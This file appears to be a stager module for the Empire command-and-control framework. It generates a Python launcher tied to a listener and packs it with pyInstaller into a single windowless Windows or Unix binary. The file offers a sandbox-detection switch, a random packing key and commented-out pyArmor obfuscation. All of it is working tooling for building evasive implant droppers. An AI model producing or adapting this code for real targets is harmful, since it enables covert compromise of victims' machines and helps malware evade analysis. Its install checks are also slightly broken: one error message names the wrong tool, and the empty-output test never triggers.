from __future__ import print_function

import logging
import os
import time
from builtins import object

log = logging.getLogger(__name__)


class Stager(object):
    def __init__(self, mainMenu, params=None):
        if params is None:
            params = []
        self.info = {
            "Name": "pyInstaller + pyArmor Launcher",
            "Authors": [
                {
                    "Name": "0xf0b05",
                    "Handle": "@none",
                    "Link": "https://nolink",
                }
            ],
            "Description": "Generates an binary payload launcher for Empire using pyInstaller.",
            "Comments": ["“Now, I am become Death, the destroyer of worlds.”"],
        }

        # any options needed by the stager, settable during runtime
        self.options = {
            # format:
            #   value_name : {description, required, default_value}
            "Listener": {
                "Description": "Listener to generate stager for.",
                "Required": True,
                "Value": "",
            },
            "BuildArch": {
                "Description": "Destination OS for launcher.",
                "Required": True,
                "Value": "Windows",
                "SuggestedValues": ["Windows", "Unix"],
            },
            "BinaryFile": {
                "Description": "File to output launcher to.",
                "Required": True,
                "Value": "/tmp/empire",
            },
            "SafeChecks": {
                "Description": "Switch. Checks for SandBox, exit the staging process if true. "
                               "Defaults to True.",
                "Required": True,
                "Value": "True",
                "SuggestedValues": ["True", "False"],
                "Strict": True,
            },
            "UserAgent": {
                "Description": "User-agent string to use for the staging request (default, none, or other).",
                "Required": False,
                "Value": "default",
            },
            "OutFile": {
                "Description": "Filename that should be used for the generated output.",
                "Required": True,
                "Value": "Empire",
            },
        }

        # save off a copy of the mainMenu object to access external functionality
        #   like listeners/agent handlers/etc.
        self.mainMenu = mainMenu

        for param in params:
            # parameter format is [Name, Value]
            option, value = param
            if option in self.options:
                self.options[option]["Value"] = value

    def generate(self):
        # extract all of our options
        language = 'python'
        build_arch = self.options["BuildArch"]["Value"]
        listener_name = self.options["Listener"]["Value"]
        user_agent = self.options["UserAgent"]["Value"]
        safe_checks = self.options["SafeChecks"]["Value"]
        binary_file_str = self.options["BinaryFile"]["Value"]
        import subprocess

        output_str = subprocess.check_output(["which", "pyinstaller"])
        if output_str == "":
            log.error("pyInstaller is not installed")
            log.error("Try: apt install python-pip && pip install pyinstaller")
            return ""
        output_str = subprocess.check_output(["which", "pyarmor"])
        if output_str == "":
            log.error("pyInstaller is not installed")
            log.error("Try: apt install python-pip && pip install pyarmor")
            return ""
        encode = False

        # generate the launcher code
        launcher = self.mainMenu.stagers.generate_launcher(
            listenerName=listener_name,
            language=language,
            encode=encode,
            userAgent=user_agent,
            safeChecks=safe_checks,
            build_arch=build_arch
        )
        if launcher == "":
            log.error("Error in launcher command generation.")
            return ""

        with open(f'{binary_file_str}.py', 'w') as text_file:
            text_file.write(f"{launcher}")

        log.info(f"Created {binary_file_str}.py")
        import secrets
        if 'win' in build_arch.lower():
            log.info(f"Packing {binary_file_str}.py to exe file")
            pyinstaller = 'wine pyinstaller'
        else:
            log.info(f"Packing {binary_file_str}.py to bin file")
            pyinstaller = 'pyinstaller'
        # ico = 'app.ico'
        # xec = f'pyarmor-7 pack --clean --name={secrets.token_hex(8)} ' \
        #       f'-e " --onefile --noupx --noconsole --key {secrets.token_hex(8)} " ' \
        #       f'-x " --mix-str --advanced 1 " ' \
        #       f'{binary_file_str}.py'
        # subprocess.run(xec)
        # subprocess.run(
        #     [
        #         'pyarmor-7',
        #         'pack',
        #         '--clean',
        #         '--name=',
        #         f'--name={secrets.token_hex(8)}',
        #         '-e',
        #         f'"--onefile --noupx --noconsole --key {secrets.token_hex(8)} "',
        #         '-x',
        #         '"--mix-str --advanced 1 "',
        #         f'{binary_file_str}.py',
        #     ]
        # )
        command = (f'{pyinstaller} {binary_file_str}.py -y -F --clean --noupx --noconsole '
                   f'--key {secrets.token_hex(8)} '
                   f'--specpath {os.path.dirname(binary_file_str)} '
                   f'--distpath {os.path.dirname(binary_file_str)} '
                   f'--workpath /tmp/{str(time.time())}-build/')
        # log.warning(command)
        subprocess.run(command, shell=True, text=True)

        if os.path.exists(binary_file_str):
            with open(binary_file_str, "rb") as f:
                return f.read()
        log.error("Error in launcher generation.")
        return ""
